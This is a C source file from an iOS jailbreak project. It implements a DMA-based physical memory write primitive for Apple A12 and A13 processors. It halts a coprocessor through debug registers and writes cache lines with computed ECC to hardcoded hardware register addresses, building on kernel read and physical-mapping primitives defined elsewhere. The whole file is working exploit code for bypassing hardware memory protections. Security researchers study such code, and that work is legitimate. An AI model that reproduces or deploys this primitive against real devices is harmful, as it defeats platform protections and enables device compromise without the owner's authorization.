#include "jailbreak.h"
#include "utils.h"
#include "dma.h"

static dma_info_t *dma_info = NULL;

static uint64_t dma_phystov(uint64_t pa) {
    if (pa == 0) return 0;
    uint64_t page = PAGE_OF(pa);
    
    for (uint32_t i = 0; i < dma_info->mapping_count; i++) {
        if (dma_info->mapping_list[i].pa == page) {
            if (dma_info->mapping_list[i].va != 0) {
                return dma_info->mapping_list[i].va + PAGE_OFF(pa);
            }
            dma_info->mapping_list[i].pa = 0;
        }
    }
    
    for (uint32_t i = 0; i < dma_info->mapping_count; i++) {
        if (dma_info->mapping_list[i].pa == 0) {
            dma_info->mapping_list[i].va = phys_map_page(page);
            if (dma_info->mapping_list[i].va != 0) {
                dma_info->mapping_list[i].pa = page;
                return dma_info->mapping_list[i].va + PAGE_OFF(pa);
            }
        }
    }
    return 0;
}

static uint32_t mapped_read32(uint64_t pa) {
    uint64_t va = dma_phystov(pa);
    if (va == 0) return 0;
    return *(volatile uint32_t *)(va);
}

static uint64_t mapped_read64(uint64_t pa) {
    uint64_t va = dma_phystov(pa);
    if (va == 0) return 0;
    return *(volatile uint64_t *)(va);
}

static void mapped_write32(uint64_t pa, uint32_t value) {
    uint64_t va = dma_phystov(pa);
    if (va == 0) return;
    *(volatile uint32_t *)(va) = value;
}

static void mapped_write64(uint64_t pa, uint64_t value) {
    uint64_t va = dma_phystov(pa);
    if (va == 0) return;
    *(volatile uint64_t *)(va) = value;
}

static uint64_t process_ecc(uint64_t data) {
    uint64_t hash = 0;
    for (uint32_t i = 0; i < 8; i++) {
        for (int j = 0; j < 32; j++) {
            if (((*(volatile uint32_t *)((data + (i*4))) >> j) & 1) != 0) {
                hash ^= ecc_code[32 * i + j];
            }
        }
    }
    return hash;
}

static void dma_perform_write(uint64_t pa, void *data, uint32_t size) {
    uint32_t leftover = size;
    while (leftover > 0) {
        uint64_t cacheline_pa = (pa & ~0x3f);
        uint64_t cacheline_offset = (pa & 0x3f);
        uint64_t write_size = min(leftover, 64 - cacheline_offset);
        
        uint64_t cacheline_va = phystokv(cacheline_pa);
        if (cacheline_va == 0) return;
        uint64_t orig = mapped_read64(0x206140108);
        
        kread_buf(cacheline_va, dma_info->cacheline_data, 64);
        memcpy(&dma_info->cacheline_data[cacheline_offset], &data[size-leftover], write_size);

        mapped_write64(0x206140108, mapped_read64(0x206140108) | 0x8000000000000001);
        while ((~mapped_read64(0x206140108) & 0x8000000000000001) != 0) { usleep(80); }
        
        uint64_t value = mapped_read64(0x206140008);
        if ((value & 0x1000000000000000) == 0) mapped_write64(0x206140008, value & ~0x1000000000000000);
        
        mapped_write64(0x206140108, mapped_read64(0x206140108) & (orig | 0x8000000000000000));
        while ((mapped_read64(0x206140108) & 0x8000000000000001) != 0) { usleep(80); }
        

        uint64_t hash1 = process_ecc(dma_info->cacheline_data_va);
        uint64_t hash2 = process_ecc(dma_info->cacheline_data_va + 32);
        
        mapped_write64(0x206150040, 0x2000000 | (pa & 0x3fc0));
        for (int i = 0; i < 0x40; i+=8) {
            mapped_write64(0x206150048, *(volatile uint64_t *)(dma_info->cacheline_data_va + i));
            usleep(80);
        }
        
        uint64_t pa_upper = ((((pa >> 14) & dma_info->dma_mask) << 18) & 0x3FFFFFFFFFFFF);
        mapped_write64(0x206150048, pa_upper | (hash1 << dma_info->dma_index) | (hash2 << 50) | 0x1f);
        mapped_write64(0x206140108, mapped_read64(0x206140108) | 0x8000000000000001);

        while ((~mapped_read64(0x206140108) & 0x8000000000000001) != 0) { usleep(80); }
        value = mapped_read64(0x206140008);
        if ((value & 0x1000000000000000) == 0) {
            mapped_write64(0x206140008, value | 0x1000000000000000);
        }
        
        mapped_write64(0x206140108, mapped_read64(0x206140108) & (orig | 0x8000000000000000));
        while ((mapped_read64(0x206140108) & 0x8000000000000001) != 0) { usleep(80); }
        
        pa += write_size;
        leftover -= write_size;
    }
}

static void dma_write_buf(uint64_t pa, void *data, uint32_t size) {
    if (pa == 0 || (pa & 0x8ffffffff) != pa || data == NULL || size == 0) return;
    if ((~mapped_read32(dma_info->gfx_base) & 0xF) != 0) {
        mapped_write32(dma_info->gfx_base, dma_info->gfx_command);
        while ((~mapped_read32(dma_info->gfx_base) & 0xF) != 0) { usleep(80); }
    }

    if ((mapped_read64(0x206040000) & DBGWRAP_DBGHALT) == 0) {
        mapped_write64(0x206040000, mapped_read64(0x206040000) | DBGWRAP_DBGHALT);
        while ((mapped_read64(0x206040000) & DBGWRAP_DBGACK) == 0) { usleep(80); }
    }
    
    dma_perform_write(pa, data, size);
    usleep(200);
    
    mapped_write64(0x206040000, ((mapped_read64(0x206040000) & 0xFFFFFFFF2FFFFFFF) | 0x40000000));
    if ((mapped_read64(0x206040000) & DBGWRAP_DBGHALT) == 0) {
        while ((mapped_read64(0x206040000) & DBGWRAP_DBGACK) != 0) { usleep(80); }
    }
}

void dma_write8(uint64_t pa, uint8_t value) {
    return dma_write_buf(pa, &value, 1);
}

void dma_write16(uint64_t pa, uint16_t value) {
    return dma_write_buf(pa, &value, 2);
}

void dma_write32(uint64_t pa, uint32_t value) {
    return dma_write_buf(pa, &value, 4);
}

void dma_write64(uint64_t pa, uint64_t value) {
    return dma_write_buf(pa, &value, 8);
}

void dma_deinit(void) {
    return;
}

int dma_init(void) {
    dma_info = calloc(1, sizeof(dma_info_t));
    if (dma_info == NULL) goto err;
    
    uint32_t cpu_family = 0;
    size_t size = sizeof(cpu_family);
    sysctlbyname("hw.cpufamily", &cpu_family, &size, NULL, 0);
    
    switch (cpu_family) {
        case CPUFAMILY_ARM_VORTEX_TEMPEST: // A12
            dma_info->gfx_base = 0x23B080388;
            dma_info->gfx_command = 0x1F0003FF;
            dma_info->dma_index = 0x28;
            dma_info->dma_mask = 0x3FFFFF;
            break;
        case CPUFAMILY_ARM_LIGHTNING_THUNDER: // A13
            dma_info->gfx_base = 0x23B080390;
            dma_info->gfx_command = 0x1F0003FF;
            dma_info->dma_index = 0x28;
            dma_info->dma_mask = 0x3FFFFF;
            break;
        default: goto err;
    }
    
    dma_info->mapping_list = calloc(1, sizeof(dma_mapping_t) * 20);
    dma_info->mapping_count = 20;
    
    mach_vm_address_t cache_addr = 0;
    uint32_t flags = VM_FLAGS_ANYWHERE | VM_FLAGS_NO_CACHE;
    mach_vm_allocate(mach_task_self(), &cache_addr, kinfo->pmap_page_size, flags);
    
    if (cache_addr == 0) return -1;
    
    mach_vm_wire(kinfo->host_priv, mach_task_self(), cache_addr, kinfo->pmap_page_size, VM_PROT_DEFAULT);
    dma_info->cacheline_data_va = cache_addr;
    
    bzero((void *)cache_addr, kinfo->pmap_page_size);
    usleep(10000);
    usleep(10000);
    
    dma_info->cacheline_data_pa = vtophys(cache_addr);
    dma_info->cacheline_data = (uint8_t *)cache_addr;

    mapped_read32(dma_info->gfx_base);
    mapped_read32(0x206040000);
    mapped_read32(0x206140108);
    mapped_read32(0x206140008);
    mapped_read32(0x206150048);
    mapped_read32(0x206150040);
    return 0;
    
err:
    dma_deinit();
    return -1;
}
